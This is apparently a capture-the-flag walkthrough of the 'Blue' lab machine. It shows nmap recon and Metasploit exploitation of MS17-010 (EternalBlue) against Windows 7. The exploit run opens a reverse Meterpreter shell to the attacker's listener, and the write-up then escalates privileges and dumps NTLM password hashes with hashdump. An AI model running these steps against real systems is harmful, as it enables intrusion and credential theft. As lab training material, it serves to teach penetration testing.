---
description: >-
  Deploy & hack into a Windows machine, leveraging common misconfigurations
  issues.
---

# Blue

## Task \#1: Recon

Generated on **Tue Jul 20 05:12:11 2021** with `nmap 7.91`.

```bash
nmap -sV -n -v -Pn -p- -T4 -A --open -oX portScan.xml 10.10.146.250
```

### Open Ports and Running Services

| Port | State | Service | Version |
| :--- | :--- | :--- | :--- |
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | open | microsoft-ds | Windows 7 Professional 7601 Service Pack 1 microsoft-ds |
| 3389/tcp | open | ms-wbt-server |  |
| 49152/tcp | open | msrpc | Microsoft Windows RPC |
| 49153/tcp | open | msrpc | Microsoft Windows RPC |
| 49154/tcp | open | msrpc | Microsoft Windows RPC |
| 49158/tcp | open | msrpc | Microsoft Windows RPC |
| 49159/tcp | open | msrpc | Microsoft Windows RPC |

{% tabs %}
{% tab title="nmap vuln nse" %}
```bash
nmap -v --script vuln 10.10.246.110
```
{% endtab %}

{% tab title="Output" %}
```bash
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-20 05:18 EDT
NSE: Loaded 105 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 05:18
Completed NSE at 05:18, 10.00s elapsed
Initiating NSE at 05:18
Completed NSE at 05:18, 0.00s elapsed
Initiating Ping Scan at 05:18
Scanning 10.10.146.250 [2 ports]
Completed Ping Scan at 05:18, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 05:18
Completed Parallel DNS resolution of 1 host. at 05:18, 0.01s elapsed
Initiating Connect Scan at 05:18
Scanning 10.10.146.250 [1000 ports]
Discovered open port 3389/tcp on 10.10.146.250
Discovered open port 445/tcp on 10.10.146.250
Discovered open port 139/tcp on 10.10.146.250
Discovered open port 135/tcp on 10.10.146.250
Discovered open port 49152/tcp on 10.10.146.250
Discovered open port 49153/tcp on 10.10.146.250
Discovered open port 49158/tcp on 10.10.146.250
Discovered open port 49154/tcp on 10.10.146.250
Discovered open port 49159/tcp on 10.10.146.250
Completed Connect Scan at 05:18, 1.90s elapsed (1000 total ports)
NSE: Script scanning 10.10.146.250.
Initiating NSE at 05:18
NSE: [firewall-bypass] lacks privileges.
NSE: [tls-ticketbleed] Not running due to lack of privileges.
NSE: [ssl-ccs-injection] No response from server: ERROR
Completed NSE at 05:20, 85.59s elapsed
Initiating NSE at 05:20
Completed NSE at 05:20, 0.00s elapsed
Nmap scan report for 10.10.146.250
Host is up (0.051s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
| rdp-vuln-ms12-020: 
|   VULNERABLE:
|   MS12-020 Remote Desktop Protocol Denial Of Service Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0152
|     Risk factor: Medium  CVSSv2: 4.3 (MEDIUM) (AV:N/AC:M/Au:N/C:N/I:N/A:P)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to cause a denial of service.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0152
|   
|   MS12-020 Remote Desktop Protocol Remote Code Execution Vulnerability
|     State: VULNERABLE
|     IDs:  CVE:CVE-2012-0002
|     Risk factor: High  CVSSv2: 9.3 (HIGH) (AV:N/AC:M/Au:N/C:C/I:C/A:C)
|           Remote Desktop Protocol vulnerability that could allow remote attackers to execute arbitrary code on the targeted system.
|           
|     Disclosure date: 2012-03-13
|     References:
|       http://technet.microsoft.com/en-us/security/bulletin/ms12-020
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_sslv2-drown: 
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
49159/tcp open  unknown

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

NSE: Script Post-scanning.
Initiating NSE at 05:20
Completed NSE at 05:20, 0.00s elapsed
Initiating NSE at 05:20
Completed NSE at 05:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 98.11 seconds

```
{% endtab %}
{% endtabs %}

{% hint style="info" %}
**Machine vulnerable to** [**ms17-010**](https://es.wikipedia.org/wiki/EternalBlue)\*\*\*\*
{% endhint %}

## Task \#2: Gain Access

{% tabs %}
{% tab title="1. Stat Metasploit" %}
```bash
$ msfconsole
```
{% endtab %}

{% tab title="2. Search vuln" %}
```bash
msf6 > search ms17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce

```
{% endtab %}

{% tab title="Run exploit" %}
```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.200.80
RHOSTS => 10.10.200.80
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.9.8.228
LHOST => 10.9.8.228
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.9.8.228:4444 
[*] 10.10.200.80:445 - Running automatic check ("set AutoCheck false" to disable)
[*] 10.10.200.80:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.200.80:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.200.80:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.200.80:445 - The target is vulnerable.
[*] 10.10.200.80:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.200.80:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.200.80:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.200.80:445 - Connecting to target for exploitation.
[+] 10.10.200.80:445 - Connection established for exploitation.
[+] 10.10.200.80:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.200.80:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.200.80:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.200.80:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.200.80:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.200.80:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.200.80:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.200.80:445 - Sending all but last fragment of exploit packet
[*] 10.10.200.80:445 - Starting non-paged pool grooming
[+] 10.10.200.80:445 - Sending SMBv2 buffers
[+] 10.10.200.80:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.200.80:445 - Sending final SMBv2 buffers.
[*] 10.10.200.80:445 - Sending last fragment of exploit packet!
[*] 10.10.200.80:445 - Receiving response from exploit packet
[+] 10.10.200.80:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.200.80:445 - Sending egg to corrupted connection.
[*] 10.10.200.80:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.200.80
[*] Meterpreter session 1 opened (10.9.8.228:4444 -> 10.10.200.80:49169) at 2021-07-27 10:36:06 -0400
[+] 10.10.200.80:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.200.80:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.200.80:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter > shell
Process 2424 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```
{% endtab %}

{% tab title="Escalate" %}
```
[CTRL+z]
use post/multi/manage/shell_to_meterpreter

OR

meterpreter > getsystem
```
{% endtab %}

{% tab title="hashdump" %}
```
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

```
{% endtab %}

{% tab title="Crack password" %}
```

```
{% endtab %}
{% endtabs %}





